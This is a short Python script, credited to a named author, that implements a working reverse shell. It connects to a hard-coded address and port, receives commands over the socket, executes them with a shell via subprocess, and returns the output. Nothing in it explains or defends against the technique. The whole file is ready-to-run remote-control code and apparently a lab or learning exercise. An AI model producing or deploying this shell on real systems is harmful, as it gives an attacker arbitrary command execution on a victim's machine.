#/usr/bin/python
# Written By: Sahar Hathiramani
# Date: 01/22/2021

import socket
import subprocess 
import json

def reliable_send(data):
    jsonData = json.dumps(data.decode())
    sock.send(jsonData.encode())

def reliable_recv():
    data = b''
    while True:
        try:
            data = data + sock.recv(1024)
            return json.loads(data)
        except ValueError:
            continue

def shell():
    while True:
        command = reliable_recv()
        if command == 'exit':
            break
        else:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            reliable_send(result)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("192.168.7.125", 54321))
shell()
sock.close()
